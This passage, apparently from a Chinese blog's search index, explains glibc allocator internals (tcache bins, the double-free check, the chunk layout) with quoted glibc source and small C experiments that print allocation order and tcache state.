<code>SIZE_SZ</code>\uff0c\u200b\u662f\u56e0\u4e3a\u200b malloc \u200b\u4f1a\u200b\u7ef4\u62a4\u200b\u88ab\u200b\u5206\u914d\u200b\u7684\u200b\u5757\u200b\u7684\u200b\u4e00\u4e9b\u200b\u4fe1\u606f\u200b\uff0c\u200b\u5305\u62ec\u200b\u5757\u200b\u7684\u200b\u5927\u5c0f\u200b\u548c\u200b\u4e00\u4e9b\u200b flag\uff0c\u200b\u540e\u7eed\u200b\u4f1a\u200b\u8be6\u7ec6\u200b\u8ba8\u8bba\u200b\uff0c\u200b\u7b80\u5355\u200b\u6765\u8bf4\u200b\u5c31\u662f\u200b\u5206\u914d\u200b\u7684\u200b\u5b9e\u9645\u200b\u7a7a\u95f4\u200b\u4f1a\u200b\u6bd4\u200b\u7528\u6237\u200b\u8bf7\u6c42\u200b\u7684\u200b\u7a7a\u95f4\u200b\u8981\u200b\u66f4\u200b\u5927\u200b\u3002</p> <p>\u200b\u63a5\u7740\u200b\uff0c\u200b\u770b\u200b\u5b83\u200b\u662f\u200b\u5982\u4f55\u200b\u8ba1\u7b97\u200b\u51fa\u200b tcache index \u200b\u7684\u200b\uff1a</p> <pre><code>/* When \"x\" is from chunksize().  */\n# define csize2tidx(x) (((x) - MINSIZE + MALLOC_ALIGNMENT - 1) / MALLOC_ALIGNMENT)\n</code></pre> <p>\u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b\uff0c\u200b\u4ece\u200b MINSIZE \u200b\u5f00\u59cb\u200b\uff0c\u200b\u4ee5\u200b MALLOC_ALIGNMENT \u200b\u4e3a\u200b\u5355\u4f4d\u200b\uff0c\u200b\u6bcf\u4e2a\u200b bin \u200b\u5bf9\u5e94\u200b\u4e00\u4e2a\u200b\u7ecf\u8fc7\u200b align \u200b\u4ee5\u540e\u200b\u7684\u200b\u53ef\u80fd\u200b\u7684\u200b\u5185\u5b58\u200b\u5757\u200b\u5927\u5c0f\u200b\u3002\u200b\u5f97\u5230\u200b tcache index \u200b\u540e\u200b\uff0c\u200b\u68c0\u67e5\u200b\u5bf9\u5e94\u200b\u7684\u200b bin \u200b\u662f\u5426\u200b\u6709\u200b\u7a7a\u95f2\u200b\u5757\u200b\uff0c\u200b\u5982\u679c\u200b\u6709\u200b\uff0c\u200b\u5219\u200b\u76f4\u63a5\u200b\u5206\u914d\u200b\uff1a</p> <pre><code>if (tc_idx &lt; mp_.tcache_bins\n    &amp;&amp; tcache\n    &amp;&amp; tcache-&gt;counts[tc_idx] &gt; 0)\n  {\n    return tcache_get (tc_idx);\n  }\n</code></pre> <p>\u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b\uff0ctcache \u200b\u76f8\u5f53\u4e8e\u200b\u662f\u200b\u4e00\u4e2a\u200b per thread \u200b\u7684\u200b\u5c0f\u200b\u7f13\u5b58\u200b\uff0c\u200b\u8bb0\u5f55\u200b\u4e86\u200b\u6700\u8fd1\u200b\u91ca\u653e\u200b\u7684\u200b\u5185\u5b58\u200b\u5757\u200b\uff0c\u200b\u53ef\u200b\u4f9b\u200b malloc \u200b\u4f7f\u7528\u200b\u3002\u200b\u7531\u4e8e\u200b bin \u200b\u7684\u200b\u6570\u91cf\u200b\u6709\u9650\u200b\uff0c\u200b\u6240\u4ee5\u200b\u6bd4\u8f83\u200b\u5927\u200b\u7684\u200b\u5185\u5b58\u200b\u5206\u914d\u200b\u4e0d\u4f1a\u200b\u7ecf\u8fc7\u200b tcache\u3002</p> <p>P.S. <code>calloc</code> \u200b\u4e0d\u4f1a\u200b\u4f7f\u7528\u200b tcache\uff0c\u200b\u800c\u662f\u200b\u7528\u200b\u540e\u9762\u200b\u63d0\u5230\u200b\u7684\u200b <code>_int_malloc</code> \u200b\u8fdb\u884c\u200b\u5404\u79cd\u200b\u5206\u914d\u200b\u3002</p>"},{"location":"software/glibc_allocator.html#free","title":"free","text":"<p>\u200b\u65e2\u7136\u200b malloc \u200b\u7528\u5230\u200b\u4e86\u200b tcache\uff0c\u200b\u81ea\u7136\u200b free \u200b\u5c31\u8981\u200b\u5f80\u91cc\u9762\u200b\u653e\u200b\u7a7a\u95f2\u200b\u5757\u200b\u4e86\u200b\uff0c\u200b\u76f8\u5173\u200b\u7684\u200b\u4ee3\u7801\u200b\u5728\u200b <code>_int_free</code> \u200b\u51fd\u6570\u200b\u5f53\u4e2d\u200b\uff1a</p> <pre><code>size_t tc_idx = csize2tidx (size);\nif (tcache != NULL &amp;&amp; tc_idx &lt; mp_.tcache_bins)\n  {\n    /* Check to see if it's already in the tcache.  */\n    tcache_entry *e = (tcache_entry *) chunk2mem (p);\n\n    /* This test succeeds on double free.  However, we don't 100%\n       trust it (it also matches random payload data at a 1 in\n       2^&lt;size_t&gt; chance), so verify it's not an unlikely\n       coincidence before aborting.  */\n    if (__glibc_unlikely (e-&gt;key == tcache))\n      {\n        tcache_entry *tmp;\n        LIBC_PROBE (memory_tcache_double_free, 2, e, tc_idx);\n        for (tmp = tcache-&gt;entries[tc_idx];\n             tmp;\n             tmp = tmp-&gt;next)\n          if (tmp == e)\n            malloc_printerr (\"free(): double free detected in tcache 2\");\n            /* If we get here, it was a coincidence.  We've wasted a\n               few cycles, but don't abort.  */\n      }\n\n    if (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)\n      {\n        tcache_put (p, tc_idx);\n        return;\n      }\n  }\n</code></pre> <p>\u200b\u5b83\u200b\u7684\u200b\u903b\u8f91\u200b\u4e5f\u200b\u4e0d\u200b\u590d\u6742\u200b\uff1a</p> <ol> <li>\u200b\u8ba1\u7b97\u200b tcache index\uff0c\u200b\u627e\u5230\u200b\u5bf9\u5e94\u200b\u7684\u200b bin</li> <li>\u200b\u68c0\u67e5\u200b\u5b83\u200b\u662f\u4e0d\u662f\u200b\u5df2\u7ecf\u200b\u88ab\u200b free \u200b\u8fc7\u200b\u4e86\u200b\uff0c\u200b\u5373\u200b double free\uff1afree \u200b\u8fc7\u200b\u7684\u200b\u6307\u9488\u200b\uff0c\u200b\u5b83\u200b\u7684\u200b key \u200b\u5b57\u200b\u6bb5\u200b\u5e94\u5f53\u200b\u6307\u5411\u200b tcache\uff0c\u200b\u5982\u679c\u200b\u5b9e\u9645\u200b\u68c0\u6d4b\u200b\u5230\u200b\u662f\u200b\u8fd9\u6837\u200b\uff0c\u200b\u90a3\u200b\u5c31\u200b\u53bb\u200b tcache \u200b\u91cc\u200b\u904d\u5386\u200b\u94fe\u8868\u200b\uff0c\u200b\u68c0\u67e5\u200b\u662f\u4e0d\u662f\u200b\u771f\u7684\u200b\u5728\u200b\u91cc\u9762\u200b\uff0c\u200b\u5982\u679c\u200b\u662f\u200b\uff0c\u200b\u8bf4\u660e\u200b double free \u200b\u4e86\u200b\uff0c\u200b\u62a5\u9519\u200b</li> <li>\u200b\u5982\u679c\u200b\u5bf9\u5e94\u200b\u7684\u200b bin \u200b\u7684\u200b\u94fe\u8868\u200b\u957f\u5ea6\u200b\u4e0d\u662f\u200b\u5f88\u957f\u200b\uff08\u200b\u9608\u503c\u200b\u662f\u200b <code>mp_.tcache_count</code>\uff0c\u200b\u53d6\u503c\u200b\u89c1\u540e\u200b\uff09\uff0c\u200b\u5219\u200b\u6dfb\u52a0\u200b\u5230\u200b\u94fe\u8868\u200b\u5934\u90e8\u200b\uff0c\u200b\u5b8c\u6210\u200b free \u200b\u7684\u200b\u8fc7\u7a0b\u200b</li> </ol> <p>\u200b\u90a3\u4e48\u200b tcache \u200b\u9ed8\u8ba4\u200b\u60c5\u51b5\u200b\u4e0b\u6709\u200b\u591a\u200b\u5927\u200b\u5462\u200b\uff1a</p> <pre><code>/* We want 64 entries.  This is an arbitrary limit, which tunables can reduce.  */\n# define TCACHE_MAX_BINS  64\n/* This is another arbitrary limit, which tunables can change.  Each\n   tcache bin will hold at most this number of chunks.  */\n# define TCACHE_FILL_COUNT 7\n</code></pre> <p>\u200b\u4e5f\u5c31\u662f\u8bf4\u200b\uff0c\u200b\u5b83\u200b\u6709\u200b 64 \u200b\u4e2a\u200b bin\uff0c\u200b\u6bcf\u4e2a\u200b bin \u200b\u7684\u200b\u94fe\u8868\u200b\u6700\u200b\u591a\u200b 7 \u200b\u4e2a\u200b\u7a7a\u95f2\u200b\u5757\u200b\u3002</p> <p>\u200b\u5728\u200b 64 \u200b\u4f4d\u4e0b\u200b\uff0c\u200b\u8fd9\u200b 64 \u200b\u4e2a\u200b bin \u200b\u5bf9\u5e94\u200b\u7684\u200b\u5757\u200b\u5927\u5c0f\u200b\u662f\u4ece\u200b 32 \u200b\u5b57\u8282\u200b\u5230\u200b 1040 \u200b\u5b57\u8282\u200b\uff0c\u200b\u6bcf\u200b 16 \u200b\u5b57\u8282\u200b\u4e00\u4e2a\u200b bin\uff08<code>(1040 - 32) / 16 + 1 = 64</code>\uff09\u3002\u200b\u90a3\u4e48\u200b\uff0c<code>malloc(1032)</code> \u200b\u6216\u200b\u66f4\u200b\u5c0f\u200b\u7684\u200b\u5206\u914d\u200b\u4f1a\u200b\u7ecf\u8fc7\u200b tcache\uff0c\u200b\u800c\u200b <code>malloc(1033)</code> \u200b\u6216\u200b\u66f4\u200b\u5927\u200b\u7684\u200b\u5206\u914d\u200b\u5219\u200b\u4e0d\u4f1a\u200b\u3002</p>"},{"location":"software/glibc_allocator.html#_1","title":"\u5b9e\u9a8c","text":"<p>\u200b\u4e0b\u9762\u200b\u6765\u200b\u5199\u200b\u4e00\u6bb5\u200b\u7a0b\u5e8f\u200b\u6765\u200b\u89c2\u5bdf\u200b tcache \u200b\u7684\u200b\u884c\u4e3a\u200b\uff0c\u200b\u8003\u8651\u200b\u5230\u200b\u4ece\u200b\u94fe\u8868\u200b\u5934\u90e8\u200b\u63d2\u5165\u200b\u548c\u200b\u5220\u9664\u200b\u662f\u200b\u540e\u8fdb\u5148\u51fa\u200b\uff08LIFO\uff09\uff0c\u200b\u76f8\u5f53\u4e8e\u200b\u662f\u200b\u4e00\u4e2a\u200b\u6808\u200b\uff0c\u200b\u6240\u4ee5\u200b\u5206\u914d\u200b\u4e24\u4e2a\u200b\u5927\u5c0f\u200b\u76f8\u540c\u200b\u7684\u200b\u5757\u200b\uff0c\u200b\u91ca\u653e\u200b\u540e\u200b\u518d\u200b\u5206\u914d\u200b\u76f8\u540c\u200b\u5927\u5c0f\u200b\u7684\u200b\u5757\u200b\uff0c\u200b\u5f97\u5230\u200b\u7684\u200b\u6307\u9488\u200b\u7684\u200b\u987a\u5e8f\u200b\u5e94\u8be5\u200b\u662f\u200b\u53cd\u8fc7\u6765\u200b\u7684\u200b\uff1a</p> <pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nint main() {\n  void *p1 = malloc(32);\n  void *p2 = malloc(32);\n  free(p1);\n  free(p2);\n  void *p3 = malloc(32);\n  void *p4 = malloc(32);\n  printf(\"p1=%p p2=%p p3=%p p4=%p\\n\", p1, p2, p3, p4);\n}\n</code></pre> <p>\u200b\u8f93\u51fa\u200b\u5982\u4e0b\u200b\uff1a</p> <pre><code>p1=0x55fb2f9732a0 p2=0x55fb2f9732d0 p3=0x55fb2f9732d0 p4=0x55fb2f9732a0\n</code></pre> <p>\u200b\u7ed3\u679c\u200b\u7b26\u5408\u200b\u9884\u671f\u200b\uff0ctcache \u200b\u7684\u200b\u5185\u90e8\u200b\u72b6\u6001\u200b\u53d8\u5316\u200b\u8fc7\u7a0b\u200b\u5982\u4e0b\u200b\uff1a</p> <ol> <li><code>free(p1)</code>\uff1ap1 \u200b\u53d8\u6210\u200b\u94fe\u8868\u200b\u7684\u200b\u5934\u90e8\u200b</li> <li><code>free(p2)</code>\uff1ap2 \u200b\u53d8\u6210\u200b\u94fe\u8868\u200b\u7684\u200b\u5934\u90e8\u200b\uff0cnext \u200b\u6307\u9488\u200b\u6307\u5411\u200b p1</li> <li><code>p3 = malloc(32)</code>: p2 \u200b\u662f\u200b\u94fe\u8868\u200b\u7684\u200b\u5934\u90e8\u200b\uff0c\u200b\u6240\u4ee5\u200b\u88ab\u200b\u5206\u914d\u200b\u7ed9\u200b p3\uff0c\u200b\u4e4b\u540e\u200b p1 \u200b\u6210\u4e3a\u200b\u94fe\u8868\u200b\u7684\u200b\u5934\u90e8\u200b</li> <li><code>p4 = malloc(32)</code>: p1 \u200b\u662f\u200b\u94fe\u8868\u200b\u7684\u200b\u5934\u90e8\u200b\uff0c\u200b\u6240\u4ee5\u200b\u88ab\u200b\u5206\u914d\u200b\u7ed9\u200b p4</li> </ol> <p>\u200b\u5982\u679c\u200b\u4fee\u6539\u200b\u5206\u914d\u200b\u7684\u200b\u5927\u5c0f\u200b\uff0c\u200b\u8ba9\u200b\u5b83\u4eec\u200b\u88ab\u200b\u653e\u5230\u200b\u4e0d\u540c\u200b\u7684\u200b bin\uff0c\u200b\u5c31\u200b\u4e0d\u4f1a\u200b\u51fa\u73b0\u200b\u987a\u5e8f\u200b\u98a0\u5012\u200b\u7684\u200b\u60c5\u51b5\u200b\uff1a</p> <pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nint main() {\n  void *p1 = malloc(32);\n  void *p2 = malloc(48);\n  free(p1);\n  free(p2);\n  void *p3 = malloc(32);\n  void *p4 = malloc(48);\n  printf(\"p1=%p p2=%p p3=%p p4=%p\\n\", p1, p2, p3, p4);\n}\n</code></pre> <p>\u200b\u8f93\u51fa\u200b\u5982\u4e0b\u200b\uff1a</p> <pre><code>p1=0x5638e68db2a0 p2=0x5638e68db2d0 p3=0x5638e68db2a0 p4=0x5638e68db2d0\n</code></pre> <p>\u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b p3 \u200b\u7b49\u4e8e\u200b p1\uff0cp4 \u200b\u7b49\u4e8e\u200b p2\u3002\u200b\u6b64\u65f6\u200b p1 \u200b\u548c\u200b p3 \u200b\u5c5e\u4e8e\u200b\u540c\u4e00\u4e2a\u200b bin\uff0c\u200b\u800c\u200b p2 \u200b\u548c\u200b p4 \u200b\u5c5e\u4e8e\u200b\u53e6\u200b\u4e00\u4e2a\u200b bin\u3002</p> <p>\u200b\u65e2\u7136\u200b\u6211\u4eec\u200b\u77e5\u9053\u200b\u4e86\u200b tcache \u200b\u7684\u200b\u5185\u90e8\u200b\u6784\u9020\u200b\uff0c\u200b\u6211\u4eec\u200b\u53ef\u4ee5\u200b\u5199\u200b\u4e00\u4e2a\u200b\u7a0b\u5e8f\u200b\uff0c\u200b\u9996\u5148\u200b\u5f97\u5230\u200b tcache \u200b\u7684\u200b\u5730\u5740\u200b\uff0c\u200b\u518d\u200b\u6253\u5370\u200b\u51fa\u200b\u6bcf\u6b21\u200b malloc/free \u200b\u4e4b\u540e\u200b\u7684\u200b\u72b6\u6001\u200b\uff1a</p> <pre><code>#include &lt;stdint.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\n#define TCACHE_MAX_BINS 64\n\ntypedef struct tcache_entry {\n  struct tcache_entry *next;\n  struct tcache_perthread_struct *key;\n} tcache_entry;\n\ntypedef struct tcache_perthread_struct {\n  uint16_t counts[TCACHE_MAX_BINS];\n  tcache_entry *entries[TCACHE_MAX_BINS];\n} tcache_perthread_struct;\n\nvoid dump_tcache(tcache_perthread_struct *tcache) {\n  for (int i = 0; i &lt; TCACHE_MAX_BINS; i++) {\n    if (tcache-&gt;counts[i]) {\n      tcache_entry *p = tcache-&gt;entries[i];\n      printf(\"tcache bin #%d: %p\", i, p);\n      p = p-&gt;next;\n      while (p) {\n        printf(\" -&gt; %p\", p);\n        p = p-&gt;next;\n      }\n      printf(\"\\n\");\n    }\n  }\n}\n\nint main() {\n  // leak tcache address\n  void *p0 = malloc(128);\n  free(p0);\n  tcache_entry *entry = p0;\n  tcache_perthread_struct *tcache = entry-&gt;key;\n  printf(\"tcache is at %p\\n\", tcache);\n  // clear tcache\n  p0 = malloc(128);\n\n  void *p1 = malloc(32);\n  void *p2 = malloc(32);\n  free(p1);\n  printf(\"after free(p1):\\n\");\n  dump_tcache(tcache);\n  free(p2);\n  printf(\"after free(p2):\\n\");\n  dump_tcache(tcache);\n  void *p3 = malloc(32);\n  printf(\"after malloc(p3):\\n\");\n  dump_tcache(tcache);\n  void *p4 = malloc(32);\n  printf(\"after malloc(p4):\\n\");\n  dump_tcache(tcache);\n  printf(\"p1=%p p2=%p p3=%p p4=%p\\n\", p1, p2, p3, p4);\n}\n</code></pre> <p>\u200b\u8fd0\u884c\u200b\u7ed3\u679c\u200b\u5982\u4e0b\u200b\uff1a</p> <pre><code>tcache is at 0x558f39310010\nafter free(p1):\ntcache bin #1: 0x558f39310740\nafter free(p2):\ntcache bin #1: 0x558f39310770 -&gt; 0x558f39310740\nafter malloc(p3):\ntcache bin #1: 0x558f39310740\nafter malloc(p4):\np1=0x558f39310740 p2=0x558f39310770 p3=0x558f39310770 p4=0x558f39310740\n</code></pre> <p>\u200b\u6253\u5370\u200b\u51fa\u6765\u200b\u7684\u200b\u7ed3\u679c\u200b\u548c\u200b\u9884\u671f\u200b\u4e00\u81f4\u200b\u3002</p> <p>\u200b\u63a5\u4e0b\u6765\u200b\u7ee7\u7eed\u200b\u5206\u6790\u200b malloc \u200b\u7684\u200b\u540e\u7eed\u200b\u4ee3\u7801\u200b\u3002</p>"},{"location":"software/glibc_allocator.html#__libc_malloc","title":"\u56de\u5230\u200b <code>__libc_malloc</code>","text":"<p>\u200b\u5982\u679c\u200b malloc \u200b\u6ca1\u6709\u200b\u547d\u4e2d\u200b tcache\uff0c\u200b\u6216\u8005\u200b free \u200b\u6ca1\u6709\u200b\u628a\u200b\u7a7a\u95f2\u200b\u5757\u200b\u653e\u5230\u200b tcache \u200b\u5f53\u4e2d\u200b\uff0c\u200b\u4f1a\u200b\u53d1\u751f\u200b\u4ec0\u4e48\u200b\u4e8b\u60c5\u200b\u5462\u200b\uff1f\u200b\u63a5\u4e0b\u6765\u200b\u5f80\u540e\u200b\u770b\u200b\uff0c\u200b\u9996\u5148\u200b\u662f\u200b <code>__libc_malloc</code> \u200b\u7684\u200b\u540e\u7eed\u200b\u5b9e\u73b0\u200b\uff1a</p> <pre><code>if (SINGLE_THREAD_P)\n  {\n    victim = _int_malloc (&amp;main_arena, bytes);\n    // omitted\n    return victim;\n  }\n\narena_get (ar_ptr, bytes);\n\nvictim = _int_malloc (ar_ptr, bytes);\n</code></pre> <p>\u200b\u8fd9\u91cc\u200b\u51fa\u73b0\u200b\u4e86\u200b arena \u200b\u7684\u200b\u6982\u5ff5\u200b\uff1a\u200b\u591a\u7ebf\u7a0b\u200b\u60c5\u51b5\u200b\u4e0b\u200b\uff0c\u200b\u4e3a\u4e86\u200b\u63d0\u5347\u200b\u6027\u80fd\u200b\uff0c\u200b\u540c\u65f6\u200b\u7528\u200b\u591a\u4e2a\u200b arena\uff0c\u200b\u6bcf\u4e2a\u200b arena \u200b\u7528\u200b\u4e00\u628a\u200b\u9501\u6765\u200b\u4fdd\u8bc1\u200b\u591a\u7ebf\u7a0b\u200b\u5b89\u5168\u200b\uff0c\u200b\u4ece\u800c\u200b\u4f7f\u5f97\u200b\u591a\u4e2a\u200b\u7ebf\u7a0b\u200b\u53ef\u4ee5\u200b\u540c\u65f6\u200b\u4ece\u200b\u4e0d\u540c\u200b\u7684\u200b arena \u200b\u4e2d\u200b\u5206\u914d\u5185\u5b58\u200b\u3002\u200b\u8fd9\u91cc\u200b\u5148\u200b\u4e0d\u200b\u8ba8\u8bba\u200b\u591a\u7ebf\u7a0b\u200b\u7684\u200b\u60c5\u51b5\u200b\uff0c\u200b\u5148\u200b\u5047\u8bbe\u200b\u5728\u200b\u5355\u7ebf\u7a0b\u200b\u7a0b\u5e8f\u200b\u4e0b\u200b\uff0c\u200b\u5168\u5c40\u200b\u53ea\u7528\u200b\u4e00\u4e2a\u200b arena\uff1a<code>main_arena</code>\uff0c\u200b\u7136\u540e\u200b\u4ece\u200b\u91cc\u9762\u200b\u5206\u914d\u5185\u5b58\u200b\u3002\u200b\u63a5\u4e0b\u6765\u200b\u770b\u200b <code>_int_malloc</code> \u200b\u7684\u200b\u5185\u90e8\u200b\u5b9e\u73b0\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b\u5b83\u200b\u6839\u636e\u200b\u8981\u200b\u5206\u914d\u200b\u7684\u200b\u5757\u200b\u7684\u200b\u5927\u5c0f\u200b\u8fdb\u5165\u200b\u4e86\u200b\u4e0d\u540c\u200b\u7684\u200b\u5904\u7406\u200b\uff1a</p> <pre><code>// in _int_malloc\nif ((unsigned long) (nb) &lt;= (unsigned long) (get_max_fast ()))\n  {\n    // fast bin handling\n  }\n\nif (in_smallbin_range (nb))\n  {\n    // small bin handling\n  }\nelse\n  {\n    // consolidate fast bins to unsorted bins\n  }\n\nfor (;; )\n  {\n    // process unsorted bins\n  }\n</code></pre> <p>malloc \u200b\u628a\u200b\u7a7a\u95f2\u200b\u7684\u200b\u5757\u200b\u5206\u6210\u200b\u56db\u79cd\u200b\u7c7b\u578b\u200b\u6765\u200b\u4fdd\u5b58\u200b\uff1a</p> <ol> <li>fast bin: \u200b\u7c7b\u4f3c\u200b\u524d\u9762\u200b\u7684\u200b tcache bin\uff0c\u200b\u628a\u200b\u5927\u5c0f\u200b\u76f8\u540c\u200b\u7684\u200b\u7a7a\u95f2\u200b\u5757\u200b\u653e\u5230\u200b\u94fe\u8868\u200b\u4e2d\u200b\uff0c\u200b\u518d\u200b\u7ef4\u62a4\u200b\u591a\u4e2a\u200b\u5bf9\u5e94\u200b\u4e0d\u540c\u200b\u5927\u5c0f\u200b\u7684\u200b\u7a7a\u95f2\u200b\u5757\u200b\u7684\u200b\u94fe\u8868\u200b\u5934\u200b\u6307\u9488\u200b\uff0c\u200b\u91c7\u7528\u200b\u5355\u5411\u200b\u94fe\u8868\u200b\u7ef4\u62a4\u200b</li> <li>small bin\uff1asmall bin \u200b\u4e5f\u200b\u4f1a\u200b\u628a\u200b\u76f8\u540c\u200b\u7684\u200b\u7a7a\u95f2\u200b\u5757\u200b\u653e\u5728\u200b\u94fe\u8868\u200b\u4e2d\u200b\uff0c\u200b\u4f46\u200b\u76f8\u90bb\u200b\u7684\u200b\u7a7a\u95f2\u200b\u5757\u200b\u4f1a\u200b\u88ab\u200b\u5408\u5e76\u200b\u4e3a\u200b\u66f4\u200b\u5927\u200b\u7684\u200b\u7a7a\u95f2\u200b\u5757\u200b\uff0c\u200b\u91c7\u7528\u200b\u53cc\u5411\u200b\u94fe\u8868\u200b\u7ef4\u62a4\u200b</li> <li>large bin\uff1alarge bin \u200b\u53ef\u80fd\u200b\u4fdd\u5b58\u200b\u4e0d\u540c\u200b\u5927\u5c0f\u200b\u7684\u200b\u7a7a\u95f2\u200b\u5757\u200b\uff0c\u200b\u91c7\u7528\u200b\u53cc\u5411\u200b\u94fe\u8868\u200b\u7ef4\u62a4\u200b</li> <li>unsorted bin\uff1a\u200b\u8fd1\u671f\u200b\u88ab\u200b free \u200b\u7684\u200b\u7a7a\u95f2\u200b\u5757\u200b\uff0c\u200b\u5982\u679c\u200b\u6ca1\u6709\u200b\u4fdd\u5b58\u200b\u5230\u200b tcache\uff0c\u200b\u4f1a\u200b\u88ab\u200b\u653e\u5230\u200b unsorted bin \u200b\u5f53\u4e2d\u200b\uff0c\u200b\u7559\u5f85\u200b\u540e\u7eed\u200b\u7684\u200b\u5904\u7406\u200b</li> </ol> <p>\u200b\u5728\u200b\u8ba8\u8bba\u200b\u8fd9\u4e9b\u200b bin \u200b\u7684\u200b\u7ef4\u62a4\u200b\u65b9\u5f0f\u200b\u4e4b\u524d\u200b\uff0c\u200b\u9996\u5148\u200b\u8981\u200b\u77e5\u9053\u200b glibc \u200b\u662f\u200b\u600e\u4e48\u200b\u7ef4\u62a4\u200b\u5757\u200b\u7684\u200b\uff1a\u200b\u7a7a\u95f2\u200b\u7684\u200b\u65f6\u5019\u200b\u662f\u200b\u4ec0\u4e48\u200b\u5e03\u5c40\u200b\uff0c\u200b\u88ab\u200b\u5206\u914d\u200b\u7684\u200b\u65f6\u5019\u200b\u53c8\u200b\u662f\u200b\u4ec0\u4e48\u200b\u5e03\u5c40\u200b\uff1f</p>"},{"location":"software/glibc_allocator.html#_2","title":"\u5757\u200b\u5e03\u5c40","text":"<p>glibc \u200b\u6bcf\u4e2a\u200b\u7a7a\u95f2\u200b\u5757\u200b\uff08chunk\uff09\u200b\u5bf9\u5e94\u200b\u4e86\u200b\u4e0b\u9762\u200b\u7684\u200b\u7ed3\u6784\u200b\u4f53\u200b <code>malloc_chunk</code>\uff1a</p> <pre><code>struct malloc_chunk {\n  INTERNAL_SIZE_T      mchunk_prev_size;  /* Size of previous chunk (if free).  */\n  INTERNAL_SIZE_T      mchunk_size;       /* Size in bytes, including overhead. */\n\n  struct malloc_chunk* fd;         /* double links -- used only if free. */\n  struct malloc_chunk* bk;\n\n  /* Only used for large blocks: pointer to next larger size.  */\n  struct malloc_chunk* fd_nextsize; /* double links -- used only if free. */\n  struct malloc_chunk* bk_nextsize;\n};\n</code></pre> <p>\u200b\u5b83\u200b\u7684\u200b\u5b57\u200b\u6bb5\u200b\u5982\u4e0b\u200b\uff1a</p> <ol> <li>\u200b\u76f8\u90bb\u200b\u7684\u200b\u524d\u200b\u4e00\u4e2a\u200b\u7a7a\u95f2\u200b\u5757\u200b\u7684\u200b\u5927\u5c0f\u200b <code>mchunk_prev_size</code>\uff0c\u200b\u8bb0\u5f55\u200b\u5b83\u200b\u662f\u200b\u4e3a\u4e86\u200b\u65b9\u4fbf\u200b\u627e\u5230\u200b\u524d\u200b\u4e00\u4e2a\u200b\u7a7a\u95f2\u200b\u5757\u200b\u7684\u200b\u5f00\u5934\u200b\uff0c\u200b\u8fd9\u6837\u200b\u5408\u5e76\u200b\u76f8\u90bb\u200b\u7684\u200b\u7a7a\u95f2\u200b\u5757\u200b\u5c31\u200b\u5f88\u200b\u7b80\u5355\u200b</li> <li>\u200b\u5f53\u524d\u200b\u7a7a\u95f2\u200b\u5757\u200b\u7684\u200b\u5927\u5c0f\u200b <code>mchunk_size</code>\uff0c\u200b\u7531\u4e8e\u200b\u5757\u200b\u7684\u200b\u5927\u5c0f\u200b\u662f\u200b\u5bf9\u9f50\u200b\u7684\u200b\uff0c\u200b\u6240\u4ee5\u200b\u5b83\u200b\u7684\u200b\u4f4e\u4f4d\u200b\u88ab\u200b\u7528\u6765\u200b\u8bb0\u5f55\u200b flag</li> <li><code>fd</code> \u200b\u548c\u200b <code>bk</code>\uff1asmall bin \u200b\u548c\u200b large bin \u200b\u9700\u8981\u200b\u7528\u200b\u53cc\u5411\u200b\u94fe\u8868\u200b\u7ef4\u62a4\u200b\u7a7a\u95f2\u200b\u5757\u200b\uff0c\u200b\u6307\u9488\u200b\u5c31\u200b\u4fdd\u5b58\u200b\u5728\u200b\u8fd9\u91cc\u200b</li> <li><code>fd_nextsize</code> \u200b\u548c\u200b <code>bk_next_size</code>\uff1alarge bin \u200b\u9700\u8981\u200b\u7528\u200b\u53cc\u5411\u200b\u94fe\u8868\u200b\u7ef4\u62a4\u200b\u4e0d\u540c\u200b\u5927\u5c0f\u200b\u7684\u200b\u7a7a\u95f2\u200b\u5757\u200b\uff0c\u200b\u65b9\u4fbf\u200b\u627e\u5230\u200b\u5408\u9002\u200b\u5927\u5c0f\u200b\u7684\u200b\u7a7a\u95f2\u200b\u5757\u200b</li> </ol> <p>\u200b\u8fd9\u662f\u200b\u7a7a\u95f2\u200b\u5757\u200b\u7684\u200b\u5185\u5b58\u200b\u5e03\u5c40\u200b\uff0c\u200b\u90a3\u4e48\u200b\u88ab\u200b\u5206\u914d\u200b\u7684\u200b\u5185\u5b58\u200b\u5462\u200b\uff1f\u200b\u88ab\u200b\u5206\u914d\u200b\u7684\u200b\u5185\u5b58\u200b\uff0c\u200b\u76f8\u5f53\u4e8e\u200b\u662f\u200b\u5982\u4e0b\u200b\u7684\u200b\u7ed3\u6784\u200b\uff1a</p> <pre><code>struct {\n  INTERNAL_SIZE_T      mchunk_size;       /* Size in bytes, including overhead. */\n  char payload[];                         /* malloc() returns pointer to payload */\n};\n</code></pre> <p>\u200b\u4e5f\u5c31\u662f\u8bf4\u200b\uff0c<code>malloc()</code> \u200b\u8fd4\u56de\u200b\u7684\u200b\u5730\u5740\u200b\uff0c\u200b\u7b49\u4e8e\u200b\u7a7a\u95f2\u200b\u5757\u200b\u91cc\u200b <code>fd</code> \u200b\u6240\u5728\u200b\u7684\u200b\u4f4d\u7f6e\u200b\u3002\u200b\u88ab\u200b\u5206\u914d\u200b\u7684\u200b\u5757\u200b\uff0c\u200b\u9664\u4e86\u200b\u7528\u6237\u200b\u8bf7\u6c42\u200b\u7684\u200b\u7a7a\u95f4\u200b\u4ee5\u5916\u200b\uff0c\u200b\u53ea\u6709\u200b\u524d\u9762\u200b\u7684\u200b <code>sizeof(size_t)</code> \u200b\u5927\u5c0f\u200b\u7684\u200b\u7a7a\u95f4\u200b\u662f\u200b\u5185\u5b58\u200b\u5206\u914d\u5668\u200b\u5e26\u6765\u200b\u7684\u200b\u7a7a\u95f4\u200b\u5f00\u9500\u200b\u3002\u200b\u5757\u200b\u88ab\u200b\u91ca\u653e\u200b\u4ee5\u540e\u200b\uff0c\u200b\u5b83\u200b\u88ab\u200b\u91cd\u65b0\u200b\u89e3\u91ca\u200b\u6210\u200b <code>malloc_chunk</code> \u200b\u7ed3\u6784\u200b\u4f53\u200b\uff08\u200b\u6ce8\u610f\u200b\u5b83\u4eec\u200b\u7684\u200b\u8d77\u59cb\u200b\u5730\u5740\u200b\u4e0d\u540c\u200b\uff0c<code>malloc_chunk</code> 